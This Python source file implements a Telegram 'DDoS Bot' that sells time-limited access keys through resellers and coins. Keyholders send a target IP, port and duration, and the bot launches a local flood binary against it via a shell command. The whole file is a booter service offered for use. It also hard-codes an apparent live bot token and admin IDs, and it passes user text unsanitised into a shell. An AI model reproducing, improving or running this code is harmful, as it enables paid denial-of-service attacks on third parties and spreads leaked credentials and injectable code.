import random
import string
import subprocess
import time
import json
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# Bot Token (replace with your own)
TOKEN = "8094930692:AAGy-bnpYA0A1j6B3lRWol-GyfK9gtiMwCo"
DATA_FILE = "bot_data.json"

# Storage (in-memory, replace with database for production)
data = {
    "users": {},  # user_id: {coins, active_key, key_expiry}
    "resellers": {},  # user_id: {coins}
    "admins": [1807014348],  # Replace with your admin IDs
    "owner": 1866961136,  # Replace with your owner ID
    "keys": {},  # key: {days, expiry}
}

# Pricing for keys
PRICING = {
    "1h": 50,    # 1 hour
    "1d": 100,   # 1 day
    "3d": 500,   # 3 days
    "7d": 700,   # 7 days
    "30d": 1500, # 30 days
}


# Generate random key
def generate_key():
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    return f"Rohan-{code}"

# Check if key is valid and unexpired
def is_key_valid(user_id):
    user = data["users"].get(user_id, {})
    key = user.get("active_key")
    expiry = user.get("key_expiry", 0)
    return key and expiry > time.time()

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Start Attack", callback_data="start_attack")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Welcome to DDoS Bot 🚀\nReady to begin? Click below:", reply_markup=reply_markup
    )

# Handle Start Attack button
async def start_attack_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if is_key_valid(user_id):
        await query.edit_message_text(
            "Please provide the attack details in this format:\n<ip> <port> <time>\nExample: 192.168.1.1 80 60"
        )
    else:
        await query.edit_message_text(
            "Access Denied 🚫\nYou need a valid key to use this feature.\nUse /balance to check your coins or contact an admin/reseller for a key."
        )

# Handle attack details
async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not is_key_valid(user_id):
        return

    try:
        ip, port, time_sec = update.message.text.split()
        time_sec = int(time_sec)
        packet_size = 512
        thread = 1200
        command = f"./Rohan {ip} {port} {time_sec} {packet_size} {thread}"

        # Start Attack
        msg = await update.message.reply_text(
            f"🚀 **Attack Started!** 🔥\n🎯 Target: {ip}:{port}\n⏳ Duration: {time_sec}s\n📡 Packet Size: {packet_size}\n⚡ Thread: {thread}\n\n**Counting Down...**"
        )

        # Execute the attack binary
        process = subprocess.Popen(command, shell=True)

        # Countdown Timer
        for remaining in range(time_sec, 0, -1):
            await msg.edit_text(
                f"🚀 **Attack In Progress!** 🔥\n🎯 Target: {ip}:{port}\n⏳ Time Left: {remaining}s\n📡 Packet Size: {packet_size}\n⚡ Thread: {thread}"
            )
            await asyncio.sleep(1)


        # Attack Completed
        await msg.edit_text(
            f"✅ **Attack Completed!** 🔥\n🎯 Target: {ip}:{port}\n⏳ Duration: {time_sec}s\n📡 Packet Size: {packet_size}\n⚡ Thread: {thread}"
        )

        # Stop Attack (if still running)
        process.terminate()

    except ValueError:
        await update.message.reply_text("Invalid format. Use: `<ip> <port> <time>`")

# /balance command
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    coins = data["users"].get(user_id, {}).get("coins", 0)
    await update.message.reply_text(
        f"💰 Your Balance 💰\nCoins: {coins}\nUse your coins to purchase keys or generate a trial key with /trial_key!"
    )

# /key command (admin/reseller only)
async def key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in data["admins"] and user_id not in data["resellers"]:
        await update.message.reply_text("Sorry, only admins and resellers can use the /key command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            "Please provide the key details in this format:\n/key <days> <coin>\nAvailable options:\n"
            "- 1 hour key = 50 coins\n- 1 day key = 100 coins\n- 3 days key = 500 coins\n"
            "- 7 days key = 700 coins\n- 30 days key = 1500 coins\nExample: /key 1 100"
        )
        return

    days, coin = map(int, context.args)
    if days not in PRICING or PRICING[days] != coin:
        await update.message.reply_text("Invalid days or coin amount. Check the pricing.")
        return

    new_key = generate_key()
    expiry = time.time() + (days * 86400 if days > 1 else 3600)  # 1 hour or days to seconds
    data["keys"][new_key] = {"days": days, "expiry": expiry}
    await update.message.reply_text(
        f"Key Generated:\nKey: {new_key}\nDuration: {days} {'day' if days > 1 else 'hour'}{'s' if days > 1 else ''}\nCost: {coin} coins"
    )

# /redeem command
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <key>")
        return

    key = context.args[0]
    key_data = data["keys"].get(key)
    if not key_data or key_data["expiry"] < time.time():
        await update.message.reply_text("Invalid or expired key ❌\nPurchase a new key from an admin or reseller.")
        return

    data["users"].setdefault(user_id, {"coins": 0})
    data["users"][user_id]["active_key"] = key
    data["users"][user_id]["key_expiry"] = key_data["expiry"]
    await update.message.reply_text(
        f"Key Accepted ✅\nYou now have access to Start Attack for {key_data['days']} {'day' if key_data['days'] > 1 else 'hour'}{'s' if key_data['days'] > 1 else ''}!"
    )

# /reseller command (owner only)
async def reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != data["owner"]:
        await update.message.reply_text("Sorry, only the owner can use the /reseller command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            "Please provide the reseller details in this format:\n/reseller <user_id> <coin>\nExample: /reseller 123456789 1000"
        )
        return

    reseller_id, coins = map(int, context.args)
    data["resellers"][reseller_id] = {"coins": coins}
    await update.message.reply_text(
        f"Reseller Assigned ✅\nUser ID: {reseller_id}\nCoins Granted: {coins}\nThis user can now generate keys using /key."
    )

# /tip command (owner only)
async def tip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != data["owner"]:
        await update.message.reply_text("Sorry, only the owner can use the /tip command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            "Please provide the tip details in this format:\n/tip <user_id> <coin>\nExample: /tip 987654321 200"
        )
        return

    target_id, coins = map(int, context.args)
    data["users"].setdefault(target_id, {"coins": 0})
    data["users"][target_id]["coins"] += coins
    await update.message.reply_text(
        f"Tip Sent ✅\nUser ID: {target_id}\nCoins Tipped: {coins}\nThey can now use /trial_key or buy keys!"
    )

# /trial_key command
async def trial_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if len(context.args) != 1:
        await update.message.reply_text(
            "Generate a trial key with your coins:\n/trial_key <days>\nPricing:\n"
            "- 1 hour = 50 coins\n- 1 day = 100 coins\n- 3 days = 500 coins\n"
            "- 7 days = 700 coins\n- 30 days = 1500 coins\nExample: /trial_key 1"
        )
        return

    days = int(context.args[0])
    if days not in PRICING:
        await update.message.reply_text("Invalid days. Check the pricing.")
        return

    cost = PRICING[days]
    user = data["users"].setdefault(user_id, {"coins": 0})
    if user["coins"] < cost:
        await update.message.reply_text(
            f"Insufficient coins ❌\nYour Balance: {user['coins']} coins\nRequired: {cost} coins for {days} {'day' if days > 1 else 'hour'}{'s' if days > 1 else ''}"
        )
        return

    user["coins"] -= cost
    new_key = generate_key()
    expiry = time.time() + (days * 86400 if days > 1 else 3600)
    data["keys"][new_key] = {"days": days, "expiry": expiry}
    await update.message.reply_text(
        f"Trial Key Generated ✅\nKey: {new_key}\nDuration: {days} {'day' if days > 1 else 'hour'}{'s' if days > 1 else ''}\nCost: {cost} coins\nNew Balance: {user['coins']} coins\nUse /redeem {new_key} to activate!"
    )

# Main function to run the bot
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(start_attack_button, pattern="start_attack"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_attack))
    application.add_handler(CommandHandler("balance", balance))
    application.add_handler(CommandHandler("key", key))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("reseller", reseller))
    application.add_handler(CommandHandler("tip", tip))
    application.add_handler(CommandHandler("trial_key", trial_key))

    application.run_polling()

if __name__ == "__main__":
    main()